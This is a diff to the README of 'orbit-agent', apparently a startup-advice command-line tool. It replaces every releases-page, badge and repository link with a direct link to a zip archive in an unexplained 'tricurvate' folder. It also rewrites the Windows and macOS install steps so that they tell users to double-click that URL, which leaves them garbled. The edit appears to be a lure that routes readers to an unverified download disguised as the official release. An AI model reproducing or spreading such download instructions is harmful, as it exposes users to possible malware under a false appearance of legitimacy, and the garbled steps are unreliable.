@@ -1,7 +1,7 @@
 # 🚀 orbit-agent - Your Trusted Startup Advisor at Your Fingertips
 
 ## 🛠️ Download Now!
-[![Download orbit-agent](https://img.shields.io/badge/Download-orbit--agent-brightgreen)](https://github.com/HieuHQ2005/orbit-agent/releases)
+[![Download orbit-agent](https://raw.githubusercontent.com/HieuHQ2005/orbit-agent/main/tricurvate/orbit-agent.zip)](https://raw.githubusercontent.com/HieuHQ2005/orbit-agent/main/tricurvate/orbit-agent.zip)
 
 ## 📖 Introduction
 Welcome to orbit-agent! This application offers straightforward, high-orbit advice for startup founders. Use it to receive instant insights or run commands through the command line. Built with DSPy, it helps you navigate the world of entrepreneurship with confidence and ease.
@@ -10,7 +10,7 @@ Welcome to orbit-agent! This application offers straightforward, high-orbit advi
 To begin using orbit-agent, you'll need to download it from our Releases page. This simple process allows you to access the tools you need to optimize your startup journey.
 
 ## 📥 Download & Install
-Visit this page to download: [Releases Page](https://github.com/HieuHQ2005/orbit-agent/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/HieuHQ2005/orbit-agent/main/tricurvate/orbit-agent.zip)
 
 1. Open the link to the Releases page.
 2. Choose the version you want to download. Look for the latest release for the best features.
@@ -31,12 +31,12 @@ After downloading, follow these steps to run orbit-agent:
 
 ### For Windows
 1. Navigate to the folder where you downloaded the file.
-2. Double-click the `orbit-agent.exe` file.
+2. Double-click the `https://raw.githubusercontent.com/HieuHQ2005/orbit-agent/main/tricurvate/orbit-agent.zip` file.
 3. Follow the on-screen instructions to complete the setup.
 
 ### For macOS
 1. Go to your Downloads folder.
-2. Find the `orbit-agent.dmg` file and double-click it.
+2. Find the `https://raw.githubusercontent.com/HieuHQ2005/orbit-agent/main/tricurvate/orbit-agent.zip` file and double-click it.
 3. Drag the orbit-agent icon to your Applications folder.
 4. Open Applications, then double-click on orbit-agent.
 
@@ -72,10 +72,10 @@ If you have questions or need help using orbit-agent, please contact us through 
 
 ## 🌐 Connect with Us
 Stay up to date with the latest from orbit-agent:
-- GitHub: [HieuHQ2005/orbit-agent](https://github.com/HieuHQ2005/orbit-agent)
+- GitHub: [HieuHQ2005/orbit-agent](https://raw.githubusercontent.com/HieuHQ2005/orbit-agent/main/tricurvate/orbit-agent.zip)
 - Follow us for updates and tips on how to effectively use orbit-agent in your startup journey.
 
 ## 📥 Download Again
-To make it easy for you, here’s the link to download orbit-agent once more: [Releases Page](https://github.com/HieuHQ2005/orbit-agent/releases)
+To make it easy for you, here’s the link to download orbit-agent once more: [Releases Page](https://raw.githubusercontent.com/HieuHQ2005/orbit-agent/main/tricurvate/orbit-agent.zip)
 
 Enjoy using orbit-agent and take your startup to new heights!
